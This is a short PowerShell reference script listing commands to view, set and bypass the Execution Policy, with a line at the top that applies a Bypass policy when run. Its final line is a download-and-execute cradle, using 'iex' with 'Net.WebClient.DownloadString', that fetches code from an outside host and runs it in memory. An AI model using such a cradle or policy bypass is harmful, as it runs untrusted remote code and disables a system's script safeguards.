#Requires -version 5.1
<#
This script provides various methods to set the Execution Policy, including bypassing it entirely for testing purposes.
#>

### For testing purposes only, use the following line to bypass the execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Force



<#---------------------------------------------------[Execution Policy Commands]-------------------------------------------------#>
## Commands to be used to set the Execution Policy in PowerShell.

Get-ExecutionPolicy
Get-ExecutionPolicy -List | Format-Table -AutoSize

### Set the ExecutionPolicy for the CurrentUser 
Set-Executionpolicy -ExecutionPolicy UnRestricted -Scope CurrentUser 

### Set to unrestricted for the duration of current Session
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

### Bypass ExecutionPolicy for a single script 
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1



## Run script without changing the execution policy
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
#TYPE .runme.ps1 | PowerShell.exe -noprofile -
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('win.xga.io')"